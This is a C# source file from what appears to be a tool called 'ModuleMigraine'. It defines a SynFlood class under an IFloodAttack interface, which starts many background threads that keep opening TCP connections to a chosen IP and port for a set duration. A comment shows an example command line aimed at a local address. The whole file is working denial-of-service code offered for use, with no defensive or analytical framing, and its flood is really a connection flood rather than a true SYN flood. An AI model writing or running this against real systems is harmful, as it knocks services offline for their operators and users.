﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace ModuleMigraine
{
    public class SynFlood : IFloodAttack
    {

        private Thread[] threads;
        private IPEndPoint host;
        private int delay;
        private int startTime;
        private int duration;
        //migraine syn-flood  192.168.1.3 8080 20 1 600
        public SynFlood(string ip, int port, int threads, int delay, int duration)
        {
            this.host = new IPEndPoint(IPAddress.Parse(ip), port);
            this.threads = new Thread[threads];
            this.delay = delay;
            this.duration = duration;
        }

        public void Start()
        {
            startTime = (Int32)(DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1))).TotalSeconds;

            for (int i = 0; i < threads.Length; i++)
            {
                this.threads[i] = new Thread(floodTcp);
                this.threads[i].IsBackground = true;
                this.threads[i].Start();
            }
        }

        public void Stop()
        {
            for (int i = 0; i < threads.Length; i++)
            {
                if (threads[i].IsAlive)
                {
                    threads[i].Abort();
                }
            }
        }


        private void floodTcp()
        {
            try
            {
                Socket sock;
                int currTime = startTime;
                while (currTime < startTime + duration)
                {
                    sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    sock.NoDelay = true;

                    try
                    {
                        sock.Connect(host);
                    }
                    catch
                    {
                        continue;
                    }

                    Thread.Sleep(delay);
                    currTime = (Int32)(DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1))).TotalSeconds;
                }
            }
            catch
            {

            }
        }
    }
}
